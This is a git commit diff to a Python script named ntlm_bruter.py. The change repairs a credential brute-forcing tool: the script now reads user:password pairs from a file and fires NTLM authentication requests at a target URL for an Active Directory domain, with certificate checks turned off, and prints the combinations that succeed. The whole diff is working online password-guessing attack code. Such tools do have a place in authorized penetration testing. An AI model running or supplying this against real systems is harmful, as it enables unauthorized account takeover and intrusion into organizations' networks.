afce1f24652e6522ce4b198a518705378f6b3f34
LoBuHi SecOps <37011545+lobuhi@users.noreply.github.com>
2023-01-11 10:11:01 +0100

    Update ntlm_bruter.py

--- ntlm_bruter.py
+++ ntlm_bruter.py
@@ -20,16 +20,13 @@ try:
     url = sys.argv[1]
     ad_domain = sys.argv[2]
     ad_domain_w = ad_domain+'\\'
-    with open('usernames.txt') as f:
-        usernames = ', '.join(f.read().splitlines()).split(', ')
-    with open('passwords.txt') as f:
-        for i in f:
-            for passwords in i.strip().split(', '):
-                for user in usernames:
-                    print("Trying: " + ad_domain_w + user + ":" + passwords)
-                    auth=HttpNtlmAuth('ad_domain_w\\user','passwords')
-                    response=requests.get(url, auth=auth, verify=False)
-                    if response.status_code == 200:
-                        print ("SUCCESS: %s\%s - %s" % (ad_domain, user, passwords))
+    with open('all.txt') as f:
+        for line in f:
+            user, password = line.strip().split(':')
+            print("Trying: " + ad_domain_w + user + ":" + password)
+            auth = HttpNtlmAuth(ad_domain_w+user, password)
+            response = requests.get(url, auth=auth, verify=False)
+            if response.status_code == 200:
+                print ("SUCCESS: %s\%s - %s" % (ad_domain, user, password))
 except (IndexError, TypeError):
     print('Error: Please provide a valid URL and AD Domain Name')
